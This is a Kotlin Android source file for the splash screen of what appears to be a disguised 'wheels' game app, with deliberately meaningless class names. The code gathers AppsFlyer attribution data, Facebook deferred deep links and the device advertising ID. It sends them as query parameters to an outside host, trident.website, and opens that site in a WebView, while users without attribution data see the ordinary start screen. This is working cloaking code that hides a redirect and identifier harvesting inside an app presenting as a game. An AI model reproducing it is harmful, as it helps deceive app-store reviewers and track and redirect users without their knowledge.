package whsa.rools.wheels.ui

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.View
import androidx.core.net.toUri
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import androidx.navigation.navOptions
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import whsa.rools.wheels.R
import whsa.rools.wheels.WebViewActivity
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

private const val URL_VALUE = "https://trident.website/w4STvgFP"

@SuppressLint("CustomSplashScreen")
class gdfgdffhgdvbcgdf : Fragment(R.layout.fgffdhdfgbvf) {

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        lifecycleScope.launch(Dispatchers.Main) {
            delay(10_000L)
            findNavController().navigate(
                R.id.startingFragment, null,
                navOptions {
                    popUpTo(R.id.nav_graph) {
                        inclusive = true
                    }
                }
            )
        }
        StartingDataManager(requireContext()).url.onEach {
            startWebViewActivity(it)
        }.launchIn(lifecycleScope + Dispatchers.IO)
    }

    private fun startWebViewActivity(url: String) {
        // starting web activity
        startActivity(
            Intent(requireContext(), WebViewActivity::class.java)
                .putExtra(
                    "url",
                    url
                )
        )

        requireActivity().finish()
    }
}

private sealed interface DataWrapper<out T> {
    object Starting : DataWrapper<Nothing>
    data class Data<T>(val value: T) : DataWrapper<T>
}

private class StartingDataManager(private val context: Context) {
    private val appsFlyer =
        MutableStateFlow<DataWrapper<MutableMap<String, Any>?>>(DataWrapper.Starting)
    private var facebookData = MutableStateFlow<DataWrapper<String?>>(
        DataWrapper.Starting
    )

    init {
        val listener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                appsFlyer.tryEmit(DataWrapper.Data(p0))
            }

            override fun onConversionDataFail(p0: String?) {
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(p0: String?) {
            }
        }
        AppsFlyerLib.getInstance().init("Szw2P6uzCYgvKhVjQ3Spc6", listener, context)
        AppsFlyerLib.getInstance().start(context)

        AppLinkData.fetchDeferredAppLinkData(context) { data ->
            facebookData.tryEmit(DataWrapper.Data(data?.targetUri.toString()))
        }
    }

    private val data = appsFlyer.combine(facebookData) { it1, it2 ->
        Log.e("AppsFlyer", "${(it1 as? DataWrapper.Data)?.value}")
        Log.e("Deeplink", "${(it2 as? DataWrapper.Data)?.value}")
        Pair(it1, it2)
    }

    private val urlFromLocal = flow {
        emit(context.getSharedPreferences("MyPref", Context.MODE_PRIVATE).getString("links", null))
    }

    private val urlFromRemote =
        data.filter { it.first is DataWrapper.Data && it.second is DataWrapper.Data }.map {
            val appsFlyerMap = (it.first as DataWrapper.Data).value
            val tempDeepLink = (it.second as DataWrapper.Data).value
            val deepLink = tempDeepLink?.replace("myapp://", "")
            val tempCompaign = appsFlyerMap?.get("campaign")
            val compaign = tempCompaign.toString().replace("||", "&")
                .replace("_", "=")

            if (tempCompaign == "null" && deepLink.toString() == "null") {
                OneSignal.sendTag("key2", "organic")
            } else if (tempCompaign != "null") {
                OneSignal.sendTag(
                    "key2",
                    tempCompaign.toString().substringAfter("sub1_").substringBefore("||sub2")
                )
            } else if (deepLink.toString() != "null") {
                OneSignal.sendTag(
                    "key2",
                    tempDeepLink.toString().substringAfter("sub1_").substringBefore("||sub2")
                )
            }

            val url = URL_VALUE.toUri().buildUpon().apply {
                appendQueryParameter("gadid", getAdvId())
                appendQueryParameter(
                    "af_id",
                    AppsFlyerLib.getInstance().getAppsFlyerUID(context)
                )
                appendQueryParameter("orig_cost", appsFlyerMap?.get("orig_cost").toString())
                appendQueryParameter("adset_id", appsFlyerMap?.get("adset_id").toString())
                appendQueryParameter("campaign_id", appsFlyerMap?.get("campaign_id").toString())
                appendQueryParameter("source", appsFlyerMap?.get("media_source").toString())
                appendQueryParameter("bundle", context.packageName)
                appendQueryParameter("af_siteid", appsFlyerMap?.get("af_siteid").toString())
                appendQueryParameter("currency", appsFlyerMap?.get("currency").toString())
                appendQueryParameter("adset", encode(appsFlyerMap?.get("adset").toString()))
                appendQueryParameter("adgroup", encode(appsFlyerMap?.get("adgroup").toString()))
                if (deepLink != "null" && deepLink.toString().contains("sub")) {
                    appendQueryParameter(
                        "app_campaign",
                        encode(deepLink.toString().replace("||", "&").replace("_", "="))
                    )
                } else {
                    val c = appsFlyerMap?.get("c")?.toString()
                    if (c != "null" && c.toString().contains("sub")) {
                        appendQueryParameter(
                            "app_campaign",
                            encode(c.toString().replace("||", "&").replace("_", "="))
                        )
                    } else {
                        appendQueryParameter(
                            "app_campaign",
                            encode(
                                compaign
                            )
                        )
                    }
                }
            }.build()
            Log.e("URL", url.toString())
            url.toString()
        }

    val url = urlFromLocal.flatMapLatest {
        if (it.isNullOrBlank()) {
            urlFromRemote
        } else {
            flow { emit(it) }
        }
    }

    private suspend fun getAdvId(): String = suspendCoroutine {
        val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
        val gadid = adInfo.id.toString()
        OneSignal.setExternalUserId(gadid)
        it.resume(gadid)
    }

    private fun encode(string: String) = Uri.encode(string)
}
